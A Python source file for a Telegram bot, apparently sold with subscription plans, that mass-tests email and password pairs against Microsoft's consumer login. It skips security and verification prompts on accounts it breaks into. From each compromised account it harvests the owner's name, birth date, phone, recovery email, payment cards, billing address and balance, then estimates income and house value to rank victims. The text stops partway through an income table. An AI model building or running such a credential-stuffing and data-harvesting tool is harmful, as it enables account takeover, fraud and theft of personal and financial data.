#!/usr/bin/env python3
"""
ORBIT Lead Generator — Single File
Everything in one file. Uses ORBIT's exact login flow.
"""
import os, re, sys, json, time, uuid, base64, queue, sqlite3, shutil
import zipfile, threading, asyncio, logging, urllib.parse
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple
from dotenv import load_dotenv
load_dotenv()

import base64
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                           CallbackQueryHandler, filters, ContextTypes)

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN       = os.getenv('BOT_TOKEN', '')
ADMIN_IDS       = [int(x) for x in os.getenv('ADMIN_IDS','').split(',') if x.strip()]
DB_PATH         = os.getenv('DB_PATH', 'leads.db')
HOMEDATA_KEY    = os.getenv('HOMEDATA_API_KEY', '')
MAX_FILE_MB     = 10
THREADS_FREE    = 30
THREADS_VIP     = 100
DAILY_FREE      = 5000
DAILY_VIP       = 999999
MAX_CONCURRENT  = 3   # max simultaneous scans

PLAN_LIMITS = {
    'free':    {'daily': DAILY_FREE,  'threads': THREADS_FREE},
    'weekly':  {'daily': 15000,       'threads': 80},
    'monthly': {'daily': DAILY_VIP,   'threads': THREADS_VIP},
    'yearly':  {'daily': DAILY_VIP,   'threads': 150},
}

# ── Constants ─────────────────────────────────────────────────────────────────
_UA_MOB  = ('Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) '
            'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
            'Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0')
_UA_DESK = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')

MS_DOMAINS = {
    'outlook.com','hotmail.com','live.com','msn.com','windowslive.com',
    'live.co.uk','live.fr','live.de','live.it','live.nl','live.com.au',
    'live.ca','live.jp','live.be','live.com.mx','live.com.ar','live.com.br',
    'live.co.za','live.in','live.se','live.dk','live.no','live.fi','live.at',
    'live.ch','live.ie','live.pt','live.gr','live.ru','live.pl','live.cz',
    'live.hu','live.ro','hotmail.co.uk','hotmail.fr','hotmail.de','hotmail.it',
    'hotmail.es','hotmail.nl','hotmail.be','hotmail.se','hotmail.no','hotmail.dk',
    'hotmail.fi','hotmail.ch','hotmail.at','hotmail.com.br','hotmail.com.ar',
    'hotmail.com.mx','hotmail.co.jp','hotmail.co.za','hotmail.com.au','hotmail.ca',
    'hotmail.pt','hotmail.gr','hotmail.ru','hotmail.pl','hotmail.cz','hotmail.hu',
    'hotmail.ro','hotmail.ie','passport.com',
}

# ── Database (sqlite3) ────────────────────────────────────────────────────────
def db_init():
    c = sqlite3.connect(DB_PATH)
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        uid INTEGER PRIMARY KEY,
        username TEXT, first_name TEXT,
        plan TEXT DEFAULT 'free',
        plan_expires TEXT,
        daily_used INTEGER DEFAULT 0,
        last_reset TEXT,
        total_leads INTEGER DEFAULT 0,
        total_checked INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid INTEGER, proxy_string TEXT, is_active INTEGER DEFAULT 1
    )''')
    c.commit(); c.close()

def db_user(uid, username='', first_name=''):
    c = sqlite3.connect(DB_PATH)
    c.row_factory = sqlite3.Row
    row = c.execute('SELECT * FROM users WHERE uid=?',(uid,)).fetchone()
    if not row:
        c.execute('INSERT INTO users(uid,username,first_name) VALUES(?,?,?)',
                  (uid,username,first_name))
        c.commit()
        row = c.execute('SELECT * FROM users WHERE uid=?',(uid,)).fetchone()
    else:
        if username or first_name:
            c.execute('UPDATE users SET username=?,first_name=? WHERE uid=?',
                      (username or row['username'],first_name or row['first_name'],uid))
            c.commit()
    result = dict(row); c.close()
    return result

def db_update(uid, **kwargs):
    if not kwargs: return
    sets = ', '.join(f'{k}=?' for k in kwargs)
    vals = list(kwargs.values()) + [uid]
    c = sqlite3.connect(DB_PATH)
    c.execute(f'UPDATE users SET {sets} WHERE uid=?', vals)
    c.commit(); c.close()

def db_users_all():
    c = sqlite3.connect(DB_PATH); c.row_factory = sqlite3.Row
    rows = c.execute('SELECT * FROM users').fetchall()
    c.close(); return [dict(r) for r in rows]

def db_proxies(uid):
    c = sqlite3.connect(DB_PATH); c.row_factory = sqlite3.Row
    rows = c.execute('SELECT proxy_string FROM proxies WHERE uid=? AND is_active=1',(uid,)).fetchall()
    c.close(); return [r['proxy_string'] for r in rows]

def db_save_proxies(uid, lines):
    c = sqlite3.connect(DB_PATH)
    c.execute('DELETE FROM proxies WHERE uid=?',(uid,))
    c.executemany('INSERT INTO proxies(uid,proxy_string) VALUES(?,?)',
                  [(uid,l) for l in lines[:5000]])
    c.commit(); c.close()

def get_plan(u):
    plan = u.get('plan','free')
    # Check expiry
    exp = u.get('plan_expires')
    if exp and plan != 'free':
        try:
            if datetime.utcnow() > datetime.fromisoformat(exp):
                db_update(u['uid'], plan='free', plan_expires=None)
                plan = 'free'
        except Exception: pass
    return PLAN_LIMITS.get(plan, PLAN_LIMITS['free'])

def check_daily(u):
    """Reset daily counter if new day. Returns remaining lines."""
    last = u.get('last_reset','')
    today = datetime.utcnow().strftime('%Y-%m-%d')
    if last != today:
        db_update(u['uid'], daily_used=0, last_reset=today)
        u['daily_used'] = 0
    p = get_plan(u)
    daily = p['daily']
    used  = u.get('daily_used', 0)
    return daily - used if daily < 999999 else 999999

# ── MS Login (ORBIT MEOW exact copy) ──────────────────────────────────────────


def create_optimized_session():
    """Same session setup as ORBIT checker — proven to work."""
    session = requests.Session()
    session.verify = False
    session.headers['User-Agent'] = _UA_MOB
    return session

_LOGIN_CONFIGS = [
    dict(
        url=("https://login.live.com/ppsecure/post.srf"
             "?username=%7bemail%7d&client_id=0000000048170EF2"
             "&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341"
             "&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb"
             "&pid=15216&prompt=none"),
        ppft=("-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf"
              "!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz"
              "2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDS"
              "b*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvs"
              "Mog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALU"
              "t*!SRaI02p*XUqePtNtJzw$$"),
        cookie=("MSPRequ=id=N&lt=1765024327&co=1; "
                "uaid=a5b22c26bc704002ac309462e8d061bb; "
                "MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2"),
    ),
    dict(
        url=("https://login.live.com/ppsecure/post.srf"
             "?username=%7bemail%7d&client_id=0000000048170EF2"
             "&contextid=F3FB0F6AB3D6991E&opid=5F188DEDF4A1266A"
             "&bk=1768757278&uaid=b1d1e6fbf8b24f9b8a73b347b178d580"
             "&pid=15216&prompt=none"),
        ppft=("-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3Hmm"
              "MLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpV"
              "aBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCu"
              "cF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI"
              "2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$"),
        cookie=("MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4; "
                "MUID=009CC129162F6E173020D77717446F0A; "
                "uaid=b1d1e6fbf8b24f9b8a73b347b178d580; "
                "MSPRequ=id=N&lt=1768757278&co=1; "
                "MSPOK=$uuid-a26bdf97-2619-4f16-ba61-6b189e1f6e0f"),
    ),
]
_cfg_lock = threading.Lock()
_cfg_toomany = [0] * len(_LOGIN_CONFIGS)
_cfg_reset_at = [0.0] * len(_LOGIN_CONFIGS)

def _record_toomany(idx):
    with _cfg_lock:
        now = time.time()
        if now - _cfg_reset_at[idx] > 60:
            _cfg_toomany[idx] = 0
            _cfg_reset_at[idx] = now
        _cfg_toomany[idx] += 1


def get_fresh_ppft(email, session):
    """Returns (url_post, ppft, cookie_str) or None."""
    for _ in range(2):
        try:
            r = session.get(
                'https://login.live.com/oauth20_authorize.srf',
                params={
                    'client_id':     '0000000048170EF2',
                    'redirect_uri':  'https://login.live.com/oauth20_desktop.srf',
                    'response_type': 'token',
                    'scope':         'offline_access openid profile service::outlook.office.com::MBI_SSL',
                    'display':       'touch',
                    'login_hint':    email,
                    'msproxy':       '1',
                },
                headers={
                    'User-Agent':          _UA_MOB,
                    'client-request-id':   str(uuid.uuid4()),
                    'Accept':              'text/html,*/*',
                },
                timeout=10,
            )
            text = r.text
            if '"urlPost":"' not in text:
                continue
            url_post = text.split('"urlPost":"')[1].split('",')[0]

            ppft = None
            for start, end in [
                ('name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"'),
                ('name="PPFT" id="i0327" value="',            '"'),
                ('"sFT":"',                                   '"'),
                ("sFTTag:'",                                  "'"),
            ]:
                if start in text:
                    try:
                        v = text.split(start)[1].split(end)[0]
                        if v and len(v) > 10:
                            ppft = v; break
                    except Exception:
                        continue

            if not ppft:
                continue

            ck = r.cookies.get_dict()
            parts = [f'{k}={ck[k]}' for k in
                     ('MSPRequ','uaid','MSPOK','OParams','MSFPC','MUID') if ck.get(k)]
            if not parts:
                parts.append(f'MSPOK=$uuid-{uuid.uuid4()}')
            return url_post, ppft, '; '.join(parts)
        except Exception:
            continue
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS — bypass functions ported from Go code
# ═══════════════════════════════════════════════════════════════════════════════

def _extract_hidden(body, name):
    for pat in [
        f'name="{name}" id="{name}" value="',
        f'id="{name}" name="{name}" value="',
        f'name="{name}" value="',
        f'id="{name}" value="',
    ]:
        idx = body.find(pat)
        if idx >= 0:
            rest = body[idx + len(pat):]
            end  = rest.find('"')
            if end > 0:
                return rest[:end]
    return ''


def _extract_action(body, form_id):
    for pat in [
        f'id="{form_id}" method="post" action="',
        f'id="{form_id}" action="',
        f'method="post" id="{form_id}" action="',
        f'name="{form_id}" id="{form_id}" action="',
        f'name="{form_id}" method="post" action="',
    ]:
        idx = body.find(pat)
        if idx >= 0:
            rest = body[idx + len(pat):]
            end  = rest.find('"')
            if end > 0:
                v = rest[:end]
                if 'http' in v:
                    return v
    return ''


def _bypass_proofs(session, body):
    """Auto-skip the security proofs page → converts ERROR→HIT."""
    fmhf = _extract_action(body, 'fmHF') or _extract_action(body, 'iProofsForm')
    if not fmhf:
        return
    try:
        r2 = session.post(fmhf, data={
            'ipt':   _extract_hidden(body, 'ipt'),
            'pprid': _extract_hidden(body, 'pprid'),
            'uaid':  _extract_hidden(body, 'uaid'),
        }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_DESK, 'Referer': 'https://account.live.com/'},
           timeout=8, allow_redirects=True)
        action2 = _extract_action(r2.text, 'frmAddProof') or _extract_action(r2.text, 'fmHF')
        if action2:
            session.post(action2, data={
                'iProofOptions': 'Email', 'action': 'Skip',
                'canary': _extract_hidden(r2.text, 'canary'),
                'DisplayPhoneCountryISO': 'US',
                'DisplayPhoneNumber': '', 'EmailAddress': '',
                'PhoneNumber': '', 'PhoneCountryISO': '',
            }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': _UA_DESK}, timeout=8, allow_redirects=True)
    except Exception:
        pass


def _bypass_privacy(session, body):
    """Auto-accept the privacy notice → converts ERROR→HIT."""
    priv = _extract_action(body, 'fmHF') or _extract_action(body, 'privacyForm')
    if not priv:
        return
    try:
        cod = _extract_hidden(body, 'code') or _extract_hidden(body, 'state')
        session.post(priv, data={
            'correlation_id': _extract_hidden(body, 'correlation_id'),
            'code':           cod,
            'client_info':    _extract_hidden(body, 'client_info'),
            'action':         'accept',
        }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_DESK, 'Origin': 'https://login.live.com',
                    'Referer': 'https://login.live.com/'}, timeout=8, allow_redirects=True)
    except Exception:
        pass


def _bypass_update(session, body):
    """Auto-skip account update page → returns True if bypassed."""
    action = _extract_action(body, 'fmHF') or _extract_action(body, 'updateForm')
    if not action:
        return False
    try:
        r = session.post(action, data={
            'action': 'Skip',
            'canary': _extract_hidden(body, 'canary'),
            'pprid':  _extract_hidden(body, 'pprid'),
            'uaid':   _extract_hidden(body, 'uaid'),
            'ipt':    _extract_hidden(body, 'ipt'),
        }, headers={'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': _UA_DESK}, timeout=8, allow_redirects=True)
        return r.status_code == 200
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2 — LOGIN ATTEMPT  (meow.py _spykii_attempt + Go keywords)
# ═══════════════════════════════════════════════════════════════════════════════

def spykii_attempt(session, email, password,
                   url, ppft, cookie):
    """
    Returns (session, token_or_None) on HIT,
            'None' on BAD,
            '2FA'  on 2FA/blocked,
            'ERROR' on rate-limit / network error.
    """
    _BAD = (
        'your account or password is incorrect', 'password is incorrect',
        "that microsoft account doesn't exist", "account doesn't exist",
        "we couldn't find an account", 'incorrect username or password',
        'the email address or password is incorrect',
        'sign-in name or password does not match',
    )
    _2FA = (
        'two-step verification', 'two-step', 'two factor',
        'verify your identity', 'verification code', 'enter the code',
        'authenticator app', 'microsoft authenticator', 'approve the request',
        'sign-in was blocked', 'account is locked', 'account has been locked',
        'unusual activity', 'suspicious activity', 'confirm your identity',
        'help us protect your account', 'keep your account secure',
        'we need to verify', "prove it's you",
    )
    _2FA_RAW = (
        '/cancel?mkt=', '/abuse?mkt=', '/Abuse?mkt=',
        'identity/confirm', 'account.live.com/recover?mkt',
        '/Proofs/Verify', 'proofs/verify',
    )
    _TOOMANY = (
        'you have tried too many times', 'tried too many',
        'too many incorrect password', ',ac:null,',
        'please retry with a different device', 'another sign-in method',
        "we're having trouble", 'something went wrong',
    )

    c429 = 0
    while True:
        try:
            r = session.post(
                url,
                data={
                    'ps': '2', 'psRNGCDefaultType': '1',
                    'psRNGCEntropy': '', 'psRNGCSLK': ppft,
                    'canary': '', 'ctx': '', 'hpgrequestid': '',
                    'PPFT': ppft, 'PPSX': 'Pas', 'NewUser': '1',
                    'FoundMSAs': '', 'fspost': '0', 'i21': '0',
                    'CookieDisclosure': '0', 'IsFidoSupported': '1',
                    'isSignupPost': '0', 'isRecoveryAttemptPost': '0',
                    'i13': '1', 'login': email, 'loginfmt': email,
                    'type': '11', 'LoginOptions': '1',
                    'lrt': '', 'lrtPartition': '',
                    'hisRegion': '', 'hisScaleUnit': '',
                    'passwd': password,
                },
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cookie':       cookie,
                    'User-Agent':   _UA_MOB,
                    'Referer':      'https://login.live.com/',
                    'Origin':       'https://login.live.com',
                    'Accept':       'text/html,application/xhtml+xml,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Upgrade-Insecure-Requests': '1',
                },
                timeout=12, allow_redirects=False,
            )
        except Exception:
            return 'ERROR'

        code = r.status_code
        if code == 429:
            c429 += 1
            if c429 >= 3:
                return 'ERROR'
            time.sleep(min(3 * c429, 8))
            continue
        if code >= 500:
            return 'ERROR'

        # Token in Location header
        loc = r.headers.get('Location', '')
        if 'access_token=' in loc:
            try:
                tok = urllib.parse.unquote(loc.split('access_token=')[1].split('&')[0])
                if tok and tok != 'None':
                    return session, tok
            except Exception:
                pass
        if 'srf?code=' in loc or 'oauth20_desktop.srf?' in loc:
            return session, None

        # Cookie-based success
        try:
            ck = {c.name: c.value for c in session.cookies}
        except Exception:
            ck = {}
        if ck.get('ANON') or ck.get('WLSSC'):
            return session, None

        try:
            body = r.text.lower()
            raw  = r.text
        except Exception:
            return 'ERROR'

        # Rate limited
        if any(k in body for k in _TOOMANY):
            return 'ERROR'

        # Bad credentials
        if any(k in body for k in _BAD):
            return 'None'

        # 2FA / blocked
        if (any(k in body for k in _2FA) or
                any(k in raw for k in _2FA_RAW)):
            return '2FA'

        # ── Bypass pages — Go code logic ─────────────────────────────────────
        if 'account.live.com/proofs' in raw:
            _bypass_proofs(session, raw)
            return session, None

        if ('privacynotice.account.microsoft.com' in raw or
                'privacy.microsoft.com' in raw):
            _bypass_privacy(session, raw)
            return session, None

        if ('account.live.com/recover' in raw or
                'account.live.com/ReputationCheck' in raw):
            if _bypass_update(session, raw):
                return session, None

        # Success keywords
        if any(k in raw for k in (
            'account.microsoft.com', 'signout?', 'Sign out', '/SignOut',
            'profile.live.com', 'sSigninName', 'www.xbox.com/en-US/',
            'outlook.live.com/mail',
        )):
            return session, None

        return 'ERROR'


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3 — FULL MS LOGIN  (meow.py _ms_login wrapper)
# ═══════════════════════════════════════════════════════════════════════════════

def ms_login_robust(email, password, session):
    """
    Returns (session, token_or_None) on HIT,
            'None' on BAD,
            '2FA'  on 2FA,
            'ERROR' on failure.
    Fresh PPFT first, then static config fallback.
    """
    # Primary: fresh PPFT (most reliable)
    fresh = get_fresh_ppft(email, session)
    if fresh:
        url_post, ppft, cookie = fresh
        result = spykii_attempt(session, email, password, url_post, ppft, cookie)
        if result not in ('None', '2FA', 'ERROR') and result is not None:
            return result
        if result in ('None', '2FA'):
            return result

    # Fallback: static configs (catches rate-limited PPFT fetches)
    cfg_order = sorted(range(len(_LOGIN_CONFIGS)), key=lambda i: _cfg_toomany[i])
    for cfg_idx in cfg_order:
        cfg = _LOGIN_CONFIGS[cfg_idx]
        url = cfg['url'].replace('%7bemail%7d', urllib.parse.quote(email))
        result = spykii_attempt(session, email, password, url, cfg['ppft'], cfg['cookie'])
        if result == 'None': return 'None'
        if result == '2FA':  return '2FA'
        if result == 'ERROR':
            _record_toomany(cfg_idx)
            continue
        if result is not None and result != 'ERROR':
            return result

    return 'ERROR'


# ═══════════════════════════════════════════════════════════════════════════════
# SILENT TOKEN  (meow.py get_auth_token — prompt=none on existing session)
# ═══════════════════════════════════════════════════════════════════════════════

def get_silent_token(session, client_id,
                     scope, redirect_uri,
                     timeout: int = 8) -> Optional[str]:
    """Gets a token silently using the already-authenticated session cookies."""
    try:
        url = (
            f'https://login.live.com/oauth20_authorize.srf'
            f'?client_id={client_id}'
            f'&response_type=token'
            f'&scope={urllib.parse.quote(scope)}'
            f'&redirect_uri={urllib.parse.quote(redirect_uri)}'
            f'&prompt=none'
        )
        r = session.get(url, headers={'User-Agent': _UA_DESK}, timeout=timeout,
                        allow_redirects=True)
        # Try final URL fragment
        final_url = r.url if r.url else ''
        for u in [final_url, r.headers.get('Location', '')]:
            if 'access_token=' in u:
                try:
                    tok = urllib.parse.parse_qs(
                        urllib.parse.urlparse(u).fragment
                    ).get('access_token', [None])[0]
                    if tok:
                        return tok
                except Exception:
                    pass
        # Try response text
        if 'access_token=' in r.text:
            try:
                frag = r.text.split('access_token=')[1].split('&')[0]
                tok  = urllib.parse.unquote(frag)
                if tok and len(tok) > 20:
                    return tok
            except Exception:
                pass
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# PROFILE  (Go getProfile — JWT cookie, no API call needed)
# ═══════════════════════════════════════════════════════════════════════════════



def extract_profile(session):
    """Name + Country — 3 fallback methods."""
    # Method 1: AMCSecAuthJWT cookie (best)
    try:
        session.get('https://account.microsoft.com/', headers={'User-Agent':_UA_DESK}, timeout=8)
    except: pass
    try:
        jwt_raw = session.cookies.get('AMCSecAuthJWT','')
        if jwt_raw:
            parts = jwt_raw.split('.')
            if len(parts) >= 2:
                payload = parts[1] + '='*(-len(parts[1])%4)
                decoded = json.loads(base64.urlsafe_b64decode(payload))
                name    = decoded.get('name','')
                country = decoded.get('ctry','')
                if not name:
                    name = f"{decoded.get('given_name','')} {decoded.get('family_name','')}".strip()
                if name or country:
                    return name or 'N/A', country or 'N/A'
    except: pass
    # Method 2: JSHP cookie
    try:
        jshp = session.cookies.get('JSHP','')
        if jshp:
            parts = jshp.split('$')
            if len(parts) >= 4:
                name = f'{parts[2].strip()} {parts[3].strip()}'.strip()
                if name: return name, 'N/A'
    except: pass
    # Method 3: profile page scrape
    try:
        r = session.get('https://account.microsoft.com/profile/',
                        headers={'User-Agent':_UA_DESK}, timeout=10)
        if r.status_code == 200:
            m = re.search(r'"displayName"\s*:\s*"([^"]+)"', r.text)
            if m: return m.group(1), 'N/A'
    except: pass
    return 'N/A', 'N/A'

_FAKE_DOBS = {'2016-05-01','2000-01-01','1900-01-01','1901-01-01','0001-01-01',
              '1970-01-01','2001-01-01','1999-01-01','1980-01-01','2016-01-01',
              '1753-01-01','9999-12-31','0000-00-00','1601-01-01'}

def extract_dob(session):
    """DOB — 4 endpoints with fake date filtering."""
    endpoints = [
        'https://account.live.com/API/GetBirthday',
        'https://account.microsoft.com/profile/api/getbirthdate',
        'https://account.microsoft.com/profile/api/getprofiledetails',
        'https://profile.live.com/cgi-bin/profilepage.exe',
    ]
    for url in endpoints:
        try:
            r = session.get(url, headers={'User-Agent':_UA_DESK}, timeout=10)
            if r.status_code == 200:
                try:
                    d = r.json()
                    v = (d.get('date') or d.get('birthdate') or d.get('BirthDate') or
                         d.get('value') or d.get('birthDay') or d.get('birthday') or
                         d.get('dob') or d.get('dateOfBirth'))
                    if v:
                        s = str(v)[:10]
                        if s not in _FAKE_DOBS:
                            try:
                                yr = int(s[:4])
                                if 1920 <= yr <= 2010: return s
                            except: pass
                except: pass
                # regex fallback on page HTML
                m = re.search(r'birthd[^"]{0,20}"(\d{4}-\d{2}-\d{2})', r.text)
                if m:
                    s = m.group(1)
                    if s not in _FAKE_DOBS:
                        try:
                            if 1920 <= int(s[:4]) <= 2010: return s
                        except: pass
        except: continue
    return 'N/A'

def extract_phone_recovery(session):
    """Phone + Recovery — security proofs + profile page fallbacks."""
    phone = rec = 'N/A'
    # Get CSRF token from security page
    csrf = ''
    try:
        r0 = session.get('https://account.microsoft.com/security',
                         headers={'User-Agent':_UA_DESK}, timeout=10)
        for pat in [r'"csrf"\s*:\s*"([^"]+)"', r'name="csrf" value="([^"]+)"',
                    r'"csrfToken"\s*:\s*"([^"]+)"']:
            m = re.search(pat, r0.text)
            if m: csrf = m.group(1); break
    except: pass

    hdrs = {'User-Agent':_UA_DESK, 'Accept':'application/json'}
    if csrf: hdrs['X-CSRF-Token'] = csrf

    for url in ['https://account.microsoft.com/security/api/proofs',
                'https://account.live.com/proofs/list',
                'https://account.microsoft.com/security/api/proofs/2',
                'https://account.microsoft.com/security/api/securityinfomethods']:
        try:
            r = session.get(url, headers=hdrs, timeout=10)
            if r.status_code == 200:
                d = r.json()
                proofs = (d if isinstance(d,list) else
                          d.get('proofs') or d.get('ProofDescriptors') or
                          d.get('methods') or d.get('items') or [])
                for p in proofs:
                    t = str(p.get('type') or p.get('Type') or
                            p.get('methodType') or p.get('proofType') or '').lower()
                    v = (p.get('data') or p.get('value') or p.get('display') or
                         p.get('obfuscatedData') or p.get('target') or '')
                    if not v: continue
                    if any(x in t for x in ('phone','sms','mobile','voice','authenticator')) and phone=='N/A':
                        phone = v
                    if any(x in t for x in ('email','alternate','recovery','backup')) and rec=='N/A':
                        rec = v
                if phone != 'N/A' or rec != 'N/A': break
        except: continue

    # Fallback: scrape security page HTML
    if phone == 'N/A' and rec == 'N/A':
        try:
            r = session.get('https://account.microsoft.com/security',
                            headers={'User-Agent':_UA_DESK}, timeout=10)
            # Phone pattern
            m = re.search(r'(\+\d[\d\s\-\.]{6,18}\d)', r.text)
            if m:
                ph = m.group(1).strip()
                if not re.match(r'\d{4}-\d{2}-\d{2}', ph): phone = ph
            # Recovery email pattern
            emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', r.text)
            for em in emails:
                if 'microsoft' not in em.lower() and 'live' not in em.lower():
                    rec = em; break
        except: pass
    return phone, rec

def extract_payment(session):
    """Cards + Address + Balance — PIFD token + billing page fallback."""
    cards=[]; address='N/A'; postcode='N/A'; balance='$0.00'
    token = get_silent_token(session, '000000000004773A',
        'PIFD.Read PIFD.Create PIFD.Update PIFD.Delete',
        'https://account.microsoft.com/auth/complete-silent-delegate-auth', timeout=8)
    if token:
        hdrs = {'Authorization':f'MSADELEGATE1.0={token}',
                'Accept':'application/json','User-Agent':_UA_DESK}
        for ep in [
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstruments',
        ]:
            try:
                r = session.get(ep, headers=hdrs, timeout=12)
                if r.status_code != 200: continue
                data = r.json()
                if not isinstance(data,list): data = data.get('value',[]) if isinstance(data,dict) else []
                seen = set()
                for item in data:
                    iid = item.get('paymentInstrumentId') or item.get('id','')
                    if iid in seen: continue
                    seen.add(iid)
                    pm = item.get('paymentMethod') or item
                    family = str(pm.get('paymentMethodFamily','') or pm.get('paymentType','')).lower().replace('_','').replace(' ','')
                    if any(x in family for x in ('creditcard','debitcard','credit','debit','card')):
                        last4 = (pm.get('lastFourDigits') or pm.get('last4Digits') or
                                 pm.get('last4') or pm.get('Last4') or
                                 (pm.get('displayNumber','')[-4:] if pm.get('displayNumber') else '') or '****')
                        month = pm.get('expiryMonth') or pm.get('expMonth') or ''
                        year  = pm.get('expiryYear')  or pm.get('expYear')  or ''
                        bank  = pm.get('issuer') or pm.get('bankName') or pm.get('cardBrand') or 'Unknown'
                        cards.append({'last4':str(last4),'bank':str(bank),'expiry':f'{month}/{year}'})
                    elif 'paypal' in family:
                        pp = pm.get('email') or pm.get('accountEmail') or 'PayPal'
                        cards.append({'last4':'PayPal','bank':pp,'expiry':''})
                    if address == 'N/A':
                        addr = (item.get('address') or item.get('billingAddress') or
                                pm.get('billingAddress') or {})
                        l1   = addr.get('address_line1') or addr.get('addressLine1') or addr.get('line1','')
                        city = addr.get('locality') or addr.get('city','')
                        st   = addr.get('administrative_area') or addr.get('state','')
                        post = addr.get('postal_code') or addr.get('postalCode') or addr.get('zip','')
                        ctry = addr.get('country') or addr.get('countryCode','')
                        if l1:
                            address  = ', '.join(filter(None,[l1,city,st,post,ctry]))
                            postcode = post or 'N/A'
                    if balance == '$0.00':
                        try:
                            bal = float(item.get('balance') or 0)
                            if bal > 0: balance = f'${bal:.2f}'
                        except: pass
                if data: break
            except Exception as e:
                logging.debug(f'payment ep: {e}'); continue

    # Address fallback: billing/addresses endpoint
    if address == 'N/A':
        try:
            r = session.get('https://account.microsoft.com/billing/api/addresses',
                            headers={'User-Agent':_UA_DESK}, timeout=8)
            if r.status_code == 200:
                addrs = r.json()
                if isinstance(addrs,list) and addrs:
                    a = addrs[0]
                    l1 = a.get('line1','') or a.get('addressLine1','')
                    if l1:
                        city = a.get('city','')
                        post = a.get('postalCode','') or a.get('zip','')
                        ctry = a.get('country','')
                        address  = ', '.join(filter(None,[l1,city,post,ctry]))
                        postcode = post or 'N/A'
        except: pass
    return cards, address, postcode, balance

def extract_enrichment(country_code, postcode):
    """
    Income + House Price hierarchy:
    1. Postcode-level (most accurate) — UK Land Registry, US ZIP, CA province, AU state etc.
    2. Country-level fallback for everything else.
    """
    house = 'N/A'; income = 'N/A'
    cc = (country_code or '').upper().strip()
    pc = (postcode or '').replace(' ','').strip()

    # ── UK: real Land Registry data ──────────────────────────────────────────
    if re.match(r'^[A-Z]{1,2}\d', pc.upper()):
        pc_upper = pc.upper()
        if HOMEDATA_KEY:
            try:
                r = requests.get(f'https://api.homedata.co.uk/v1/property/sold?postcode={pc_upper}',
                                 headers={'X-API-Key':HOMEDATA_KEY}, timeout=10)
                if r.status_code == 200:
                    price = r.json().get('average_price') or r.json().get('averagePrice')
                    if price: house = f'\u00a3{float(price):,.0f}'
            except: pass
        if house == 'N/A':
            try:
                district = re.match(r'([A-Z]{1,2}\d{1,2}[A-Z]?)', pc_upper)
                if district:
                    r = requests.get(
                        f'https://landregistry.data.gov.uk/data/ppi/average-price.json'
                        f'?postcode={district.group(1)}&_limit=1&_sort=-date', timeout=10)
                    if r.status_code == 200:
                        items = r.json().get('result',{}).get('items',[])
                        if items:
                            p = items[0].get('value') or items[0].get('averagePrice')
                            if p: house = f'\u00a3{float(p):,.0f}'
            except: pass
        # UK postcode income map
        area = pc_upper[:2] if len(pc_upper) >= 2 else pc_upper
        _UK_INC = {
            'AB':'\u00a332,500','AL':'\u00a338,200','B':'\u00a330,100','BA':'\u00a332,800',
            'BB':'\u00a329,500','BD':'\u00a328,900','BH':'\u00a335,400','BL':'\u00a329,100',
            'BN':'\u00a336,200','BR':'\u00a339,100','BS':'\u00a333,400','CB':'\u00a341,300',
            'CF':'\u00a329,800','CH':'\u00a334,500','CM':'\u00a337,200','CR':'\u00a340,100',
            'DA':'\u00a338,300','DE':'\u00a331,800','DH':'\u00a328,700','DN':'\u00a329,000',
            'E':'\u00a344,200','EC':'\u00a352,500','EH':'\u00a335,700','EN':'\u00a339,800',
